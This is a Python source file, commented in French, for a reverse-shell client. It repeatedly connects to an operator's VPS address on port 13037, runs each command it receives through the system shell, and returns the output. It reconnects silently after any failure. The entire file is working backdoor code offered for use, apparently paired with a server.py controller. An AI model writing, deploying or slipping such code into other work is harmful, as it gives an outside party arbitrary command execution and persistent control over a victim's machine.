import socket
import subprocess
import os
import time
import subprocess
import sys

try:
    import asyncio
except ImportError:
    commands = [
        ['pip', 'install', 'asyncio'],
        [sys.executable, '-m', 'pip', 'install', 'asyncio'],
    ]
    for command in commands:
        try:
            subprocess.run(command, check=True)
            break
        except subprocess.CalledProcessError:
            print(" ")

async def execute_command(command):
    try:
        result = await asyncio.to_thread(subprocess.run, command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout + result.stderr
        return output if output else "Commande exécutée, aucune sortie."
    except Exception as e:
        return str(e)

async def connect_to_server():
    HOST = 'IP VERS VOTRE VPS'
    PORT = 13037 # Meme port que celui de server.py (vous pouvez le changer)
    current_dir = os.getcwd()

    while True:
        try:
            reader, writer = await asyncio.open_connection(HOST, PORT)

            while True:
                try:
                    data = await reader.read(1024)
                    if not data:
                        break

                    command = data.decode("utf-8").strip()
                    output = await execute_command(command)
                    writer.write(output.encode("utf-8"))
                    await writer.drain()
                except Exception as e:
                    break

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(connect_to_server())
